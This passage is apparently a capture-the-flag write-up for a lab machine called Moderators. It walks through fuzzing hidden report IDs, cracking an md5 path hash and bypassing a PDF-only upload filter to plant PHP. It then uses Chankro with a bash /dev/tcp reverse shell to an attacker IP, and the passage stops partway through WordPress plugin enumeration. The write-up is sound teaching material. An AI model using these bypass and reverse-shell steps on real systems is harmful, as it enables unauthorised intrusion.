</span></span><span style="display:flex;"><span>|_http-title: Moderators
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Fri Aug 12 20:44:10 2022 -- 1 IP address (1 host up) scanned in 442.82 seconds</span>
</span></span></code></pre></div><p>I can see that ports <em>80</em> (webserver) and <em>22</em> (SSH) are open.</p>
<h3 id="surfing-the-webpage">Surfing The Webpage</h3>
<p>Looks like it is a website that provides some security services.</p>
<p><img src="home_page.png" alt="Home Page"></p>
<p>And has some pages that I can navigate to:
<img src="home_page_footer.png" alt="Home Page Footer"></p>
<p>The most interesting page was the blog page where they disclosed some vulnerabilities that they have found for customers:</p>
<p><img src="blog_page.png" alt="Blog Page"></p>
<p><img src="blog_reports.png" alt="Blog Reports"></p>
<h3 id="discovering-hidden-reports">Discovering Hidden Reports</h3>
<p>And it appears that some of these listed reports have <em>links</em> refering to them, by providing their <em>ID</em> as a <em>GET parameter</em>, but some others don&rsquo;t. However, the available reports didn&rsquo;t provide useful information, so I though of <em>bruteforcing</em> the numbers looking for some <em>hidden reports</em>.</p>
<p>I&rsquo;ll use 

<a href="http://www.edge-security.com/wfuzz.php" target="_blank"><em>WFuzz</em></a> with the <code>-z range,</code> flag to specify the range of numbers to use as payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ wfuzz -z range,0-20000 -u http://10.10.11.173/reports.php?report<span style="color:#f92672">=</span>FUZZ --hc <span style="color:#ae81ff">302</span> --hh <span style="color:#ae81ff">7888</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Target: http://10.10.11.173/reports.php?report<span style="color:#f92672">=</span>FUZZ
</span></span><span style="display:flex;"><span>Total requests: 20001
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                                                                                                            
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>000002590:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">274</span> L    <span style="color:#ae81ff">523</span> W      <span style="color:#ae81ff">9786</span> Ch     <span style="color:#e6db74">&#34;2589&#34;</span>                                                                                                                                             
</span></span><span style="display:flex;"><span>000003479:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">275</span> L    <span style="color:#ae81ff">526</span> W      <span style="color:#ae81ff">9831</span> Ch     <span style="color:#e6db74">&#34;3478&#34;</span>                                                                                                                                             
</span></span><span style="display:flex;"><span>000004222:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">273</span> L    <span style="color:#ae81ff">523</span> W      <span style="color:#ae81ff">9880</span> Ch     <span style="color:#e6db74">&#34;4221&#34;</span>                                                                                                                                             
</span></span><span style="display:flex;"><span>000007613:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">275</span> L    <span style="color:#ae81ff">523</span> W      <span style="color:#ae81ff">9790</span> Ch     <span style="color:#e6db74">&#34;7612&#34;</span>                                                                                                                                             
</span></span><span style="display:flex;"><span>000008122:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">273</span> L    <span style="color:#ae81ff">522</span> W      <span style="color:#ae81ff">9784</span> Ch     <span style="color:#e6db74">&#34;8121&#34;</span>                                                                                                                                             
</span></span><span style="display:flex;"><span>000009799:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">276</span> L    <span style="color:#ae81ff">525</span> W      <span style="color:#ae81ff">9887</span> Ch     <span style="color:#e6db74">&#34;9798&#34;</span>                                                                                                                                             
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Total time: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Processed Requests: <span style="color:#ae81ff">20001</span>
</span></span><span style="display:flex;"><span>Filtered Requests: <span style="color:#ae81ff">19995</span>
</span></span><span style="display:flex;"><span>Requests/sec.: <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><h3 id="discovering-an-information-disclosure">Discovering An Information Disclosure</h3>
<p>Navigating through newly discovered reports, I found that the report with id <em>9798</em> shows an information disclosure in <em>/logs/e21cece511f43a5cb18d4932429915ed/</em>.</p>
<p><img src="report_9798.png" alt="Report 9798"></p>
<p>The last part looks like an md5 hash so I&rsquo;ll try to crack it using hashcat:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">0</span> e21cece511f43a5cb18d4932429915ed /usr/share/wordlists/rockyou.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>e21cece511f43a5cb18d4932429915ed:9798
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>It looks like the hash of the report&rsquo;s ID is the one used here.</p>
<h3 id="discovering-pdf-logs">Discovering PDF Logs</h3>
<p>From the <em>service.php</em> page, I saw that they only accept <em>PDF</em> files:</p>
<p><img src="only_pdf_notice.png" alt="PDF Files Notice"></p>
<p>Using this information, I will try to <em>bruteforce files of /logs/e21cece511f43a5cb18d4932429915ed/</em> by appending <em>.pdf</em> at the end of each wordlist keyword from 

<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-medium-words.txt" target="_blank"><em>raft-medium-words.txt</em></a>, using 

<a href="https://github.com/ffuf/ffuf" target="_blank"><em>Ffuf</em></a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/FUZZ.pdf
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       v1.5.0 Kali Exclusive &lt;<span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> :: Method           : GET
</span></span><span style="display:flex;"><span> :: URL              : http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/FUZZ.pdf
</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
</span></span><span style="display:flex;"><span> :: Follow redirects : false
</span></span><span style="display:flex;"><span> :: Calibration      : false
</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>.html                   <span style="color:#f92672">[</span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 88ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>logs                    <span style="color:#f92672">[</span>Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 131ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.htm                    <span style="color:#f92672">[</span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3880ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.htaccess               <span style="color:#f92672">[</span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 81ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>I found <em>logs.pdf</em> being present in this directory, however it shows that logs are removed.</p>
<p><img src="logs_removed.png" alt="Logs Removed"></p>
<h2 id="discovering-a-hidden-upload-functionalitiy">Discovering a Hidden Upload Functionalitiy</h2>
<p>Cycling through other report&rsquo;s logs, I found that there are few of them disclosing <em>/logs/report_log_upload.php</em> path that appears to be the hidden way to upload files to the application.</p>
<ul>
<li>Making a list of md5 hashes for each report:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat report_number.txt 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2589</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3478</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4221</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7612</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">8121</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">9798</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ <span style="color:#66d9ef">for</span> nums in <span style="color:#66d9ef">$(</span>cat report_number.txt<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> echo -n $nums <span style="color:#e6db74">&#34;=&gt; &#34;</span>; echo -n $nums|md5sum; <span style="color:#66d9ef">done</span> &gt; report_hashes
</span></span><span style="display:flex;"><span>$ cat report_hashes 
</span></span><span style="display:flex;"><span>2589 <span style="color:#f92672">=</span>&gt; 743c41a921516b04afde48bb48e28ce6  -
</span></span><span style="display:flex;"><span>3478 <span style="color:#f92672">=</span>&gt; b071cfa81605a94ad80cfa2bbc747448  -
</span></span><span style="display:flex;"><span>4221 <span style="color:#f92672">=</span>&gt; 74d90aafda34e6060f9e8433962d14fd  -
</span></span><span style="display:flex;"><span>7612 <span style="color:#f92672">=</span>&gt; ce5d75028d92047a9ec617acb9c34ce6  -
</span></span><span style="display:flex;"><span>8121 <span style="color:#f92672">=</span>&gt; afecc60f82be41c1b52f6705ec69e0f1  -
</span></span><span style="display:flex;"><span>9798 <span style="color:#f92672">=</span>&gt; e21cece511f43a5cb18d4932429915ed  -
</span></span></code></pre></div></li>
</ul>
<p><img src="upload_php_leak.png" alt="Upload.php Leak"></p>
<p><img src="upload_page.png" alt="Upload.php Page"></p>
<p>I&rsquo;ll try to upload a dummy file and intercept the request with 

<a href="https://portswigger.net/burp" target="_blank"><em>Burp Suite</em></a>:</p>
<p><img src="burp_exploring_upload.png" alt="Intercepting Request With BurpSuite"></p>
<p>From the repeater tab, I tried to send the request as is, howerver I got an error that <em>only PDF are allowed</em>:</p>
<p><img src="Only_pdf_allowed.png" alt="Only PDF Files Are Allowed"></p>
<h3 id="learing-how-pdf-validation-works">Learing How PDF Validation Works</h3>
<p>So I need to know how this restriction is applied, in other words, I need to know if the application is checking the <em>extension</em> or the <em>content</em> of the uploaded file, or <em>both</em>, or even the <em>Content-Type</em> http header, to know if I can find some possible bypasses.</p>
<p>I&rsquo;ll try to upload the same dummy file content, but this time I&rsquo;ll change its extension to <em>.pdf</em>:</p>
<p><img src="changing_extension.png" alt="Changing File Extension"></p>
<p>I got the <em>same error</em>, which means that the backend is doing some other checks, so now I&rsquo;ll change the <em>Content-Type</em> header value to <em>application/pdf</em>:</p>
<p><img src="changing_headers.png" alt="Changing Content-Type header value"></p>
<p>Again same error.</p>
<p>This time, I&rsquo;ll alter the content of the file by adding a <em>valid PDF header</em> at the beginning (also called <em>magic bytes</em> or <em>file signature</em>):</p>
<ul>
<li>A list of file signature for various file types can be found here: <em>

<a href="https://en.wikipedia.org/wiki/List_of_file_signatures" target="_blank">https://en.wikipedia.org/wiki/List_of_file_signatures</a></em></li>
</ul>
<p>In my case, this is the hex representation of <em>pdf magic bytes</em> <code>25 50 44 46 2D</code>,  and this is the ascii representation <code>%PDF-</code>:</p>
<p><img src="file_uploaded_successfully.png" alt="File Upload Worked"></p>
<p>My dummy file has been uploaded successfully!! If I try to remove any of the previous changes the server will not accept it, which means that it is checking for everyone of these three.</p>
<h3 id="uploading-php-files-to-run-code">Uploading PHP Files To Run Code</h3>
<p>Now that I identified what the server is checking, I need to find a way to bypass this checking and upload a malicious php file.</p>
<p>First thing I&rsquo;ll try is to change the extension to <em>.pdf.php</em>, because sometimes servers check only for <em>.pdf</em> in the filename without making sure that it comes at the end:</p>
<p><img src="uploading_php_file.png" alt="Uploading A PHP File"></p>
<p>And it worked!! Now, I am able to upload php files to the server. However, I still don&rsquo;t know the location where these files are being stored. That&rsquo;s why I&rsquo;ll try to bruteforce directories inside <em>/logs/</em> looking for any hidden one where I can find these uploaded files.</p>
<p>I&rsquo;ll use 

<a href="https://github.com/OJ/gobuster" target="_blank"><em>Gobuster</em></a> and 

<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt" target="_blank"><em>common.txt</em></a> wordlist from 

<a href="https://github.com/danielmiessler/SecLists" target="_blank"><em>SecLists</em></a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.11.173/logs/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.2.0-dev
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.11.173/logs/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.2.0-dev
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>2022/11/04 14:13:20 Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>/.hta                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/.htaccess            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/.htpasswd            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 315<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.11.173/logs/css/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/uploads              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 319<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.11.173/logs/uploads/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">4704</span> / <span style="color:#ae81ff">4714</span> <span style="color:#f92672">(</span>99.79%<span style="color:#f92672">)===============================================================</span>
</span></span><span style="display:flex;"><span>2022/11/04 14:14:16 Finished
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span></code></pre></div><p><em>Uploads</em> directory has been found, however looks like directory listing is disabled in it, but this is not a problem because I can try to access the <em>temp.pdf.php</em> that I uploaded previously:</p>
<p><img src="accessing_temp.pdf.php.png" alt="Accessing temp.pdf.php"></p>
<p>Worked!!</p>
<p>It&rsquo;s time to uplaod some php code to get a reverse shell.</p>
<p>The first thing I&rsquo;ll do is execute <em>phpinfo()</em> function to see if there are any disabled functions like <em>system(), exec() &hellip;</em> which will prevent me from running commands on the target system.</p>
<p><img src="phpinfo_file_upload.png" alt="Uploading phpinfo()"></p>
<p><img src="disable_functions.png" alt="Disable Functions"></p>
<p>Unfortunately most useful functions are disabled. I need to find other ways to get a shell on the target.</p>
<h3 id="bypassing-disable-functions-using-mail-to-get-rce">Bypassing Disable Functions using mail() To Get RCE</h3>
<p>After googling a little bit, I came accross this 

<a href="https://infosecwriteups.com/how-i-bypassed-disable-functions-in-php-to-get-a-remote-shell-48b827d54979" target="_blank"><em>blog post</em></a> about how to <em>bypass disable_functions</em> in php.</p>
<p>And using 

<a href="https://github.com/TarlogicSecurity/Chankro" target="_blank"><em>chankro</em></a>, I can create a malicious php file that will allow me to get a reverse shell once I navigate to the uploaded file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat rev.sh 
</span></span><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.16.6/1234 0&gt;&amp;1&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ python2 /opt/Chankro/chankro.py --arch <span style="color:#ae81ff">64</span> --input rev.sh --output chan.php --path /dev/shm
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>     -<span style="color:#f92672">=[</span> Chankro <span style="color:#f92672">]=</span>-
</span></span><span style="display:flex;"><span>    -<span style="color:#f92672">={</span> @TheXC3LL <span style="color:#f92672">}=</span>-
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Binary file: rev.sh
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Architecture: x64
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Final PHP: chan.php
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File created!
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">28</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> kali kali  <span style="color:#ae81ff">4096</span> Nov  <span style="color:#ae81ff">4</span> 15:59 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">7</span> kali kali  <span style="color:#ae81ff">4096</span> Nov  <span style="color:#ae81ff">3</span> 21:07 ..
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> kali kali <span style="color:#ae81ff">11710</span> Nov  <span style="color:#ae81ff">4</span> 15:58 chan.php
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> kali kali    <span style="color:#ae81ff">51</span> Nov  <span style="color:#ae81ff">4</span> 15:56 rev.sh
</span></span></code></pre></div><ul>
<li><em>&ndash;arch</em> to specify the architecture.</li>
<li><em>&ndash;input</em> to specify the that contains the malicious file to be executed.</li>
<li><em>&ndash;output</em> to specify the output file.</li>
<li><em>&ndash;path</em> to specify the path where some necessary files will be written, in this case I chose <em>/dev/shm</em> which is a linux directory writable by everyone similar to <em>/tmp</em>.</li>
</ul>
<p>After executing the command, a new php file called <em>chan.php</em> will be created that holds the necessary payload to get a reverse shell. So what I&rsquo;ll do is create a new file <em>rev.pdf.php</em> that contains initailly the magic bytes <code>%PDF-</code>, then append to it the content of <em>chan.php</em> and finally upload it to the server using 

<a href="https://curl.se/" target="_blank"><em>curl</em></a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s -XPOST http://10.10.11.173/logs/report_log_upload.php -F <span style="color:#e6db74">&#34;pdfFile=@rev.pdf.php;type=application/pdf&#34;</span> -F <span style="color:#e6db74">&#34;administrator=true&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>&lt;p style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;color:white&#39;</span>&gt;&lt;big size<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;5&#39;</span>&gt;File uploaded successfully!&lt;/big&gt;&lt;/p&gt;
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><ul>
<li><em>-s</em> to specify silent mode (usually used when piping curl&rsquo;s output so that no download banner will appear).</li>
<li><em>-X</em> followed by the request method (space is not necessary but also not required).</li>
<li><em>-F</em> to specify the data sent, however it will be sent using <em>multipart/form-data</em> content-type. Data looks like this: &lsquo;<em>[parameter name]=[value];[headers specific only to current data]=[value]</em>&rsquo;.
<ul>
<li>In this case, <em>pdfFile</em> was the file paramater name, <em>@</em> is used to get the content of the file and use it as value.</li>
<li><em>type</em> header is the <em>Content-Type</em> header specific to the file being sent, in this case <em>application/pdf</em>.</li>
<li>Finally, as seen using 

<a href="https://portswigger.net/burp" target="_blank"><em>Burp Suite</em></a>, other data were being sent with the file, of parametername <em>administrator</em> and value <em>true</em>.</li>
</ul>
</li>
</ul>
<p><img src="getting_reverse_shell.png" alt="Getting Reverse Shell"></p>
<h2 id="post-enumeration-as-www-data">Post Enumeration As www-data</h2>
<p>Using <em>netstat</em> command, I can see that port <em>8080</em> is open but only accessible locally:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>www-data@moderators:/var/www/html/logs/uploads$ netstat -lntp
</span></span><span style="display:flex;"><span>netstat -lntp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Not all processes could be identified, non-owned process info
</span></span><span style="display:flex;"><span> will not be shown, you would have to be root to see it all.<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>only servers<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::80                   :::*                    LISTEN      -                   
</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::22                   :::*                    LISTEN      -                   
</span></span></code></pre></div><p>I&rsquo;ll use curl to have an idea of what web application is running on port 8080:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>www-data@moderators:/var/www/html/logs/uploads$ curl http://127.0.0.1:8080/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>Proudly powered by &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://wordpress.org/&#34;</span>&gt;WordPress&lt;/a&gt;.
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Looks like wordpress is running on this port. If I list all running processes using <em>ps</em> command, I get the following results:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>www-data@moderators:/var/www/html/logs/uploads$ ps aux
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>lexi         <span style="color:#ae81ff">886</span>  0.0  1.4 <span style="color:#ae81ff">306748</span> <span style="color:#ae81ff">59116</span> ?        S    05:39   0:03 /usr/bin/php -S 127.0.0.1:8080 -t /opt/site.new/
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>User <em>Lexi</em> is running this server form <em>/opt/site.new/</em>. Taking a quick look at the files inside, specifically at the <em>plugins</em> installed on this <em>wordpress</em> instance to see if I can find some exploits.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>www-data@moderators:/opt/site.new/wp-content/plugins$ ls -la
</span></span><span style="display:flex;"><span>ls -la
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> lexi moderators <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">14</span> 10:50 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">6</span> lexi moderators <span style="color:#ae81ff">4096</span> Nov  <span style="color:#ae81ff">4</span> 12:00 ..
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> lexi moderators <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">14</span> 10:50 brandfolder
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> lexi moderators   <span style="color:#ae81ff">28</span> Sep <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2021</span> index.php
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">5</span> lexi moderators <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">14</span> 10:50 passwords-manager
